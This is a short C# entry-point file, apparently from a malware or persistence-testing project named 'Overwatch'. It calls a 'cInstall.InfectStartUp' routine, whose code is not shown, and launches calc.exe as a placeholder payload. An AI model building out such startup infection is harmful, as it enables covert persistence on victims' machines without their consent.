using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace Overwatch
{
    class cMain
    {
        static appLog Log = new appLog();
        
        static void Main(string[] args)
        {
            try
            {
                cInstall.InfectStartUp(args);

                Process.Start("calc.exe");
            }
            catch (Exception ex)
            {
                Log.Write(ex.Message, true);
            }

            Console.ReadKey();
        }
    }
}
